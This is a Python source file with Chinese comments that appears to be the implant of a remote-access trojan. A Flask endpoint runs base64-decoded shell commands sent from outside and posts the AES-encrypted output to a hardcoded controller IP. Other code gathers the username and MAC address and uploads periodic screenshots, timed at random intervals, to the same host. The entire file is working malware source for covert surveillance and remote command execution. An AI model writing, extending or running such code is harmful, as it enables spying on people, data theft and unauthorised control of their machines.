import base64  # 导入用于base64编码和解码的模块
import getpass  # 导入用于获取用户信息的模块
import json  # 导入用于处理JSON数据的模块
import random  # 导入用于生成随机数的模块
import subprocess  # 导入用于运行子进程的模块
import threading  # 导入用于多线程处理的模块
import time  # 导入用于处理时间相关操作的模块
from datetime import datetime  # 导入用于处理日期和时间的模块

import netifaces  # 导入用于获取网络接口信息的模块
import requests  # 导入用于发送HTTP请求的模块
from flask import Flask  # 导入Flask框架

from S_C.mod.screenshotter import run  # 导入自定义的截图模块
from S_C.stage.aes_utils import encrypt  # 导入自定义的AES加密函数

app = Flask(__name__)  # 创建Flask应用实例

# 生成唯一的ID，格式为"年-月-日 时-分-秒"
ID = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
IP = "192.168.117.190"

# 定义一个路由用于接收客户端发送的命令
@app.route('/cmd/<command>')
def cmd(command):
    de_command = base64.b64decode(command).decode('utf-8')  # 解码并解密命令
    # 执行命令并获取输出
    screen_data = subprocess.Popen(de_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout_lines = []  # 用于存储命令输出的行

    while True:
        line = screen_data.stdout.readline()  # 逐行读取命令输出
        if line == b'':  # 如果读取完毕，关闭stdout并退出循环
            screen_data.stdout.close()
            break
        stdout_lines.append(line.decode('gbk').encode('utf-8'))  # 将输出从GBK编码转换为UTF-8编码

    if stdout_lines:
        # 将输出进行base64编码并加密，然后发送到服务器
        dem_stdout = b'\n'.join(stdout_lines)  # 将输出行连接成一个字节串
        base64_dem_stdout = base64.b64encode(dem_stdout)  # 对输出进行base64编码
        en_dem_stdout = encrypt(base64_dem_stdout, 'dGhpc2lzbXlpdGVt')  # 对编码后的输出进行加密

        try:
            requests.post(f"http://{IP}:8080/result/", data={'result': en_dem_stdout})  # 发送加密后的输出
            print(en_dem_stdout)
        except requests.exceptions.RequestException as e:
            print(f"Error sending command result: {e}")  # 如果发送失败，打印错误信息

    return "Command executed successfully"  # 返回执行成功的信息


# 获取本机的MAC地址
def get_mac_address():
    interfaces = netifaces.interfaces()  # 获取所有网络接口
    for interface in interfaces:
        if interface == 'lo':  # 忽略回环接口
            continue
        mac = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)  # 获取接口的MAC地址
        if mac:
            return mac[0]['addr']  # 返回第一个非空的MAC地址
    return None


# 发送本机信息到服务器
def pc_info():
    username = getpass.getuser()  # 获取当前用户名
    uid = username  # 将用户名作为UID
    mac = get_mac_address()  # 获取MAC地址
    info = {'UID': uid, 'MAC': mac}  # 构造包含UID和MAC地址的信息字典
    json_info = json.dumps(info).encode('utf-8')  # 将信息字典转换为JSON格式并编码为字节串
    en_info = encrypt(json_info, 'dGhpc2lzbXlpdGVt')  # 对JSON字节串进行加密
    try:
        response = requests.post(f"http://{IP}:8080/save_info/", data=en_info)  # 将加密信息发送到服务器
        print(f"PC info sent, server response: {response.status_code}")  # 打印服务器响应状态码
    except requests.exceptions.RequestException as e:
        print(f"Error sending pc info: {e}")  # 如果发送失败，打印错误信息


# 定义截图功能
def screen():
    while True:
        img = run()  # 获取截图
        en_base64_img = base64.b64encode(img)  # 对二进制数据进行base64编码
        en_img = encrypt(en_base64_img, 'dGhpc2lzbXlpdGVt')  # 对编码后的数据进行加密
        try:
            response = requests.post(f"http://{IP}:8080/screenshotter/",
                                     data={'id': ID, 'img': en_img})  # 将加密后的截图发送到服务器
            print(f"img sent, server response: {response.status_code}")  # 打印服务器响应状态码
        except requests.exceptions.RequestException as e:
            print(f"Error sending pc info: {e}")  # 如果发送失败，打印错误信息
        time.sleep(random.randint(1200, 7200))  # 随机等待一段时间（20到120分钟）


# 启动 Flask 服务器的函数
def run_server():
    app.run(f'{IP}', 80, False)  # 运行Flask服务器


if __name__ == '__main__':
    # 创建并启动 Flask 服务器线程
    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    time.sleep(1)  # 等待服务器启动

    # 创建并启动 pc_info、screenshotter 和 keylogger 线程
    threads = [threading.Thread(target=func) for func in [pc_info, screen]]
    for thread in threads:
        thread.start()  # 启动线程

    # 等待所有线程执行结束
    for thread in threads:
        thread.join()  # 等待线程结束
